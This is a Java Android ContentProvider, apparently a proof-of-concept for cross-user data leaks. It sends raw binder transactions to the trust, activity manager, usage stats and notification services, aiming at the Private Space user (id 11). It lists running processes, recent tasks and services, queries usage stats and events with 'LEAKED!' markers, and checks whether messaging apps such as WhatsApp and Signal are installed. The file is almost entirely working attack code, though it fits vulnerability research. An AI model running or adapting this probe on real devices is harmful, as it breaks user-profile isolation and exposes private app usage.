package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Binder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class TrustClipDeepProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("trust")) {
            probeTrustDeep(cursor);
        } else if (path != null && path.contains("activity")) {
            probeActivityManager(cursor);
        } else if (path != null && path.contains("usagestats")) {
            probeUsageStats(cursor);
        } else if (path != null && path.contains("notification")) {
            probeNotificationDeep(cursor);
        } else {
            probeTrustDeep(cursor);
            probeActivityManager(cursor);
            probeUsageStats(cursor);
            probeNotificationDeep(cursor);
        }

        return cursor;
    }

    private void probeTrustDeep(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("trust");
        if (binder == null) { cursor.addRow(new Object[]{"trust", "no_binder"}); return; }
        String desc = "android.app.trust.ITrustManager";

        // TX=7: isDeviceLocked(int userId, int deviceId)  -- version with 2 args
        // Actually in Android 16 it might be: isDeviceLocked(int userId)
        // Let me try both formats
        for (int userId : new int[]{0, 11}) {
            // Try with just userId (1 arg)
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(7, data, reply, 0);
                reply.readException();
                boolean locked = reply.readInt() != 0;
                cursor.addRow(new Object[]{"isLocked1_user" + userId, String.valueOf(locked)});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"isLocked1_user" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=6: reportKeyguardShowingChanged() - no args needed
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(6, data, reply, 0);
            reply.readException();
            cursor.addRow(new Object[]{"reportKeyguard", "OK"});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"reportKeyguard", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // Scan all TX codes to find accessible ones
        for (int tx = 1; tx <= 20; tx++) {
            if (tx == 7) continue;
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        cursor.addRow(new Object[]{"trust_tx" + tx, "OK avail=" + reply.dataAvail()});
                    } catch (SecurityException e) {
                        // skip permission denied
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("KEYGUARD") && !msg.contains("Permission")) {
                            cursor.addRow(new Object[]{"trust_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private void probeActivityManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("activity");
        if (binder == null) { cursor.addRow(new Object[]{"activity", "no_binder"}); return; }
        String desc = "android.app.IActivityManager";

        // Key methods for information leakage:
        // getRunningAppProcesses — reveals all running apps
        // getRecentTasks — reveals recent activities (potentially from Private Space)

        // getRunningAppProcesses (TX varies by version, let's find it)
        // In modern Android this is usually TX around 50-80
        // Let's try the public API via reflection instead

        try {
            android.app.ActivityManager am = (android.app.ActivityManager)
                getContext().getSystemService("activity");
            java.util.List<?> processes = am.getRunningAppProcesses();
            if (processes != null) {
                cursor.addRow(new Object[]{"runningProcs", "count=" + processes.size()});
                for (int i = 0; i < Math.min(processes.size(), 15); i++) {
                    android.app.ActivityManager.RunningAppProcessInfo info =
                        (android.app.ActivityManager.RunningAppProcessInfo) processes.get(i);
                    cursor.addRow(new Object[]{"proc_" + i,
                        "uid=" + info.uid + " pid=" + info.pid + " " + info.processName});
                }
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"runningProcs", "ERR:" + truncate(e.getMessage())});
        }

        // getRecentTasks
        try {
            android.app.ActivityManager am = (android.app.ActivityManager)
                getContext().getSystemService("activity");
            java.util.List<android.app.ActivityManager.RecentTaskInfo> tasks =
                am.getRecentTasks(20, 0);
            if (tasks != null) {
                cursor.addRow(new Object[]{"recentTasks", "count=" + tasks.size()});
                for (int i = 0; i < Math.min(tasks.size(), 10); i++) {
                    android.app.ActivityManager.RecentTaskInfo task = tasks.get(i);
                    String info = "id=" + task.id;
                    if (task.baseIntent != null && task.baseIntent.getComponent() != null) {
                        info += " " + task.baseIntent.getComponent().getPackageName();
                    }
                    cursor.addRow(new Object[]{"task_" + i, info});
                }
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"recentTasks", "ERR:" + truncate(e.getMessage())});
        }

        // getRunningServices — deprecated but may still reveal info
        try {
            android.app.ActivityManager am = (android.app.ActivityManager)
                getContext().getSystemService("activity");
            java.util.List<android.app.ActivityManager.RunningServiceInfo> services =
                am.getRunningServices(100);
            if (services != null) {
                cursor.addRow(new Object[]{"runningServices", "count=" + services.size()});
                for (int i = 0; i < Math.min(services.size(), 15); i++) {
                    android.app.ActivityManager.RunningServiceInfo svc = services.get(i);
                    String info = "uid=" + svc.uid + " pid=" + svc.pid + " " +
                        (svc.service != null ? svc.service.getPackageName() + "/" + svc.service.getShortClassName() : "null");
                    cursor.addRow(new Object[]{"svc_" + i, info});
                }
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"runningServices", "ERR:" + truncate(e.getMessage())});
        }
    }

    private void probeUsageStats(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("usagestats");
        if (binder == null) { cursor.addRow(new Object[]{"usagestats", "no_binder"}); return; }
        String desc = "android.app.usage.IUsageStatsManager";

        // TX=1: queryUsageStats(int bucketType, long beginTime, long endTime, String callingPackage, int userId)
        // TX=2: queryConfigurations(...)
        // TX=3: queryEvents(long beginTime, long endTime, String callingPackage, int userId)
        // TX=4: queryEventsForPackage(...)
        // TX=5: queryEventsForUser(...)
        // TX=7: isAppStandby(String packageName, int userId)
        // TX=14: queryEventsForPackageForUser(...)

        // TX=7: isAppStandby — check if we can query for any package in user 11
        String[] packages = {"com.google.android.gms", "com.android.settings", "com.google.android.dialer"};
        for (String pkg : packages) {
            for (int userId : new int[]{0, 11}) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeString(pkg);
                    data.writeInt(userId);
                    binder.transact(7, data, reply, 0);
                    reply.readException();
                    boolean standby = reply.readInt() != 0;
                    cursor.addRow(new Object[]{"standby_" + pkg.substring(pkg.lastIndexOf('.')+1) + "_u" + userId,
                        String.valueOf(standby)});
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"standby_" + pkg.substring(pkg.lastIndexOf('.')+1) + "_u" + userId,
                        "ERR:" + truncate(e.getMessage())});
                }
                data.recycle();
                reply.recycle();
            }
        }

        // TX=1: queryUsageStats for each user
        long now = System.currentTimeMillis();
        long dayAgo = now - 86400000L;
        long weekAgo = now - 7 * 86400000L;
        for (int userId : new int[]{0, 11}) {
            for (int interval : new int[]{0, 1, 2, 3, 4}) {
                // 0=DAILY, 1=WEEKLY, 2=MONTHLY, 3=YEARLY, 4=BEST
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeInt(interval);
                    data.writeLong(weekAgo);
                    data.writeLong(now);
                    data.writeString(getContext().getPackageName());
                    data.writeInt(userId);
                    binder.transact(1, data, reply, 0);
                    reply.readException();
                    int avail = reply.dataAvail();
                    // ParceledListSlice starts with int count or inline list
                    int count = reply.readInt();
                    if (count > 0 && count < 10000) {
                        cursor.addRow(new Object[]{"usage_u" + userId + "_i" + interval,
                            "LEAKED! count=" + count + " avail=" + avail});
                        // Try reading first entry
                        if (reply.dataAvail() > 10) {
                            try {
                                // UsageStats parcelable
                                if (reply.readInt() != 0) { // non-null
                                    String pkg = reply.readString();
                                    cursor.addRow(new Object[]{"usage_u" + userId + "_first", pkg});
                                }
                            } catch (Exception ignored) {}
                        }
                    } else {
                        cursor.addRow(new Object[]{"usage_u" + userId + "_i" + interval,
                            "count=" + count + " avail=" + avail});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"usage_u" + userId + "_i" + interval,
                        "ERR:" + truncate(e.getMessage())});
                }
                data.recycle();
                reply.recycle();
            }
        }

        // TX=3: queryEvents for private space
        Parcel evData = Parcel.obtain();
        Parcel evReply = Parcel.obtain();
        try {
            evData.writeInterfaceToken(desc);
            evData.writeLong(weekAgo);
            evData.writeLong(now);
            evData.writeString(getContext().getPackageName());
            evData.writeInt(11);
            binder.transact(3, evData, evReply, 0);
            evReply.readException();
            int avail = evReply.dataAvail();
            cursor.addRow(new Object[]{"events_u11", "avail=" + avail});
            if (avail > 20) {
                cursor.addRow(new Object[]{"events_u11", "PRIVATE_SPACE_EVENTS_LEAKED! avail=" + avail});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"events_u11", "ERR:" + truncate(e.getMessage())});
        }
        evData.recycle();
        evReply.recycle();
    }

    private void probeNotificationDeep(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("notification");
        if (binder == null) { cursor.addRow(new Object[]{"notification", "no_binder"}); return; }
        String desc = "android.app.INotificationManager";

        // Try getActiveNotifications — TX varies
        // Actually use reflection on NotificationManager
        try {
            android.app.NotificationManager nm = (android.app.NotificationManager)
                getContext().getSystemService("notification");
            android.service.notification.StatusBarNotification[] active =
                nm.getActiveNotifications();
            cursor.addRow(new Object[]{"ownNotifs", "count=" + (active != null ? active.length : 0)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"ownNotifs", "ERR:" + truncate(e.getMessage())});
        }

        // TX=37 or similar: getAppActiveNotifications — try to read other apps' notifications
        // Actually, let's probe getNotificationChannels for other packages
        // TX varies significantly by version, let's just try a few

        // Try areNotificationsEnabled for other packages (reveals app install state)
        String[] targets = {"com.whatsapp", "com.instagram.android",
            "com.google.android.apps.messaging", "com.google.android.dialer",
            "com.facebook.orca", "org.thoughtcrime.securesms"};

        for (String pkg : targets) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                // areNotificationsEnabledForPackage(String pkg, int uid)
                // Need uid — guess from package
                data.writeInt(10000); // dummy uid
                binder.transact(12, data, reply, 0); // areNotificationsEnabledForPackage
                reply.readException();
                boolean enabled = reply.readInt() != 0;
                cursor.addRow(new Object[]{"notif_" + pkg.substring(pkg.lastIndexOf('.')+1), "enabled=" + enabled});
            } catch (Exception e) {
                String msg = e.getMessage();
                if (msg != null && msg.contains("Unknown package")) {
                    cursor.addRow(new Object[]{"notif_" + pkg.substring(pkg.lastIndexOf('.')+1), "NOT_INSTALLED"});
                } else {
                    cursor.addRow(new Object[]{"notif_" + pkg.substring(pkg.lastIndexOf('.')+1), "ERR:" + truncate(msg)});
                }
            }
            data.recycle();
            reply.recycle();
        }

        // Try to get notification history
        // getNotificationHistory(String callingPackage, int userId)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            binder.transact(65, data, reply, 0); // approximate TX for getNotificationHistory
            reply.readException();
            int avail = reply.dataAvail();
            cursor.addRow(new Object[]{"notifHistory", "avail=" + avail});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"notifHistory", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
